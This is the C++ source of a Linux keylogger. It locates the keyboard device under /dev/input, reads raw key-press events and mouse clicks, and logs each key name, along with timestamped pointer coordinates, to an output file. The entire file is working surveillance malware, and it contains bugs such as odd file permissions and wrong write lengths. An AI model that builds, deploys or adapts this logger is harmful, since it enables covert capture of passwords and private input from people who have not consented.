#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <sys/dir.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <string>
#include <dirent.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <X11/Xlib.h>

#define NUM_KEYCODES 71
#define NUM_EVENTS 128

using namespace std;

fd_set allset;

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"};

/*
 * Shows the usage of the program and exits
 */ 
void show_usage_and_exit(char *char_pt)
{
    fprintf(stderr, "Usage: %s output_file\n", char_pt);
    exit(1);
}

/* 
 * Writes all the designated data onto the file descriptor
 */ 
int write_all(int file_desc, const char *str)
{
    int bytesWritten = 0;
    int bytesToWrite = strlen(str) + 1;

    do
    {
        bytesWritten = write(file_desc, str, bytesToWrite);

        if (bytesWritten == -1)
        {
            return 0;
        }
        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while (bytesToWrite > 0);

    return 1;
}

/* 
 * A safe write function, error checked and prevents partial writes
 */ 
void write_to_out(int outfd, const char *str, int keyboard_fd)
{
    if (!write_all(outfd, str))
    {
        close(outfd);
        close(keyboard_fd);
        perror("write");
        exit(1);
    }
}

/* 
 * Initializes the keylogger through a select call on the keyboard
 * and the mouse file descriptors
 */ 
void keylogger_init(int keyboard_fd, int mouse_fd, int outfd)
{
    //keyboard variables
    int event_size = sizeof(struct input_event);
    int bytes_read = 0;
    struct input_event events[NUM_EVENTS]; 
    int i;

    //mouse variables
    struct input_event mouse_events[NUM_EVENTS];
    Display *dpy;
    Window root, child;
    int rootX, rootY, winX, winY;
    int mouse_bytes_read = 0;
    unsigned int mask;
    dpy = XOpenDisplay(NULL);
    XQueryPointer(dpy, DefaultRootWindow(dpy), &root, &child, &rootX, &rootY, &winX, &winY, &mask);

    // select call variables
    fd_set rset;
    FD_ZERO(&allset);
    FD_SET(keyboard_fd, &allset);
    FD_SET(mouse_fd, &allset);
    int max_fd = mouse_fd;

    while (true)
    {
        rset = allset;
        int nready = select(max_fd + 1, &rset, NULL, NULL, NULL);
        if (nready == -1)
        {
            perror("select");
            continue;
        }
        if (FD_ISSET(keyboard_fd, &rset))
        {
            bytes_read = read(keyboard_fd, events, event_size * NUM_EVENTS);

            for (int i = 0; i < (bytes_read / event_size); ++i)
            {
                if (events[i].type == EV_KEY)
                {
                    if (events[i].value == 1)
                    {
                        if (events[i].code > 0 && events[i].code < NUM_KEYCODES)
                        {
                            write_to_out(outfd, keycodes[events[i].code], keyboard_fd);
                            write_to_out(outfd, "\n", keyboard_fd);
                        }
                        else
                        {
                            write(outfd, "UNRECOGNIZED\n", sizeof("UNRECOGNIZED\n"));
                        }
                    }
                }
            }
        }
        if (FD_ISSET(mouse_fd, &rset))
        {
            mouse_bytes_read = read(mouse_fd, mouse_events, event_size * NUM_EVENTS);
            for (int i = 0; i < (mouse_bytes_read / event_size); ++i)
            {
                if (mouse_events[i].type == 0)
                {
                    if (mouse_events[i].code == 0)
                    {
                        XQueryPointer(dpy, DefaultRootWindow(dpy), &root, &child, &rootX, &rootY, &winX, &winY, &mask);
                    }
                    else if (mouse_events[i].code == 1)
                    {
                        XQueryPointer(dpy, DefaultRootWindow(dpy), &root, &child, &rootX, &rootY, &winX, &winY, &mask);
                    }
                }
                else if (mouse_events[i].type == 1)
                {
                    if (mouse_events[i].code == 272)
                    {
                        XQueryPointer(dpy, DefaultRootWindow(dpy), &root, &child, &rootX, &rootY, &winX, &winY, &mask);
                        write(outfd, "MOUSE BUTTON ", sizeof("MOUSE BUTTON "));
                        if (mouse_events[i].value == 0)
                        {
                            write(outfd, "RELEASED\n", sizeof("RELEASED\n"));
                        }
                        else if (mouse_events[i].value == 1)
                        {
                            write(outfd, "PRESSED\n", sizeof("PRESSED\n"));
                        }
                        char announcement[100] = {'\0'};
                        sprintf(announcement, "time%ld.%06ld\tx %d\ty %d\n", mouse_events[i].time.tv_sec, mouse_events[i].time.tv_usec, rootX, rootY);
                        write(outfd, announcement, sizeof(announcement));
                        fsync(outfd);
                    }
                }
            }
        }
    }
    if (bytes_read > 0)
    {
        write(outfd, "\n", keyboard_fd);
    }
}
/*
 * A function to make sure that the device chosen is a 
 * keyboard device
 */ 
int is_keyboard_device(const struct dirent *file)
{
    struct stat filestat;
    char filename[512];

    snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);

    int error = stat(filename, &filestat);
    if (error)
    {
        return 0;
    }
    return S_ISCHR(filestat.st_mode);
}

/* 
 * Obtains the correct event file for the keyboard
 */ 
char *obtain_event_file()
{
    char *keyboard_file = NULL;
    struct dirent **event_files;
    char filename[512];

    int num = scandir("/dev/input/", &event_files, &is_keyboard_device, &alphasort);
    if (num < 0)
    {
        return NULL;
    }
    else
    {
        for (int i = 0; i < num; i++)
        {
            int32_t event_bitmap = 0;
            int fd;
            int32_t keyboard_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", event_files[i]->d_name);

            int keyboard_fd = open(filename, O_RDONLY);

            if (keyboard_fd < 0)
            {
                perror("open");
                continue;
            }

            // checks if there are KEY properties within the event file chosen (aka if its a keyboard)
            ioctl(keyboard_fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if ((EV_KEY & event_bitmap) == EV_KEY)
            {
                // behaves like a keyboard
                ioctl(keyboard_fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if ((keyboard_bitmap & event_bitmap) == keyboard_bitmap)
                {
                    // device supports A, B, C, Z, so its probably a keyboard
                    keyboard_file = strdup(filename);
                    close(keyboard_fd);
                    break;
                }
            }

            close(keyboard_fd);
        }
    }
    for (int i = 0; i < num; i++)
    {
        free(event_files[i]);
    }
    free(event_files);
    return keyboard_file;
}

int main(int argc, char **argv)
{
    if (argc < 2)
    {
        show_usage_and_exit(argv[0]);
    }

    char *keyboard_device = obtain_event_file();
    printf("keyboard file: %s\n", keyboard_device);
    if (keyboard_device == NULL)
    {
        fprintf(stderr, "Error: Keyboard device not connected.");
        exit(1);
    }

    const char *mouse_device = "/dev/input/event5";
    printf("mouse file: %s\n", mouse_device);

    int output_fd;
    output_fd = open(argv[1], O_WRONLY | O_APPEND | O_CREAT, S_IROTH);
    if (output_fd < 0)
    {
        perror("output file: open");
    }

    int keyboard_fd = open(keyboard_device, O_RDONLY);
    if (keyboard_fd < 0)
    {
        perror("keyboard file: open");
    }

    int mouse_fd = open(mouse_device, O_RDONLY);
    if (mouse_fd < 0)
    {
        perror("mouse file: open");
    }

    keylogger_init(keyboard_fd, mouse_fd, output_fd);

    close(keyboard_fd);
    close(output_fd);
    free(keyboard_device);

    return 0;
}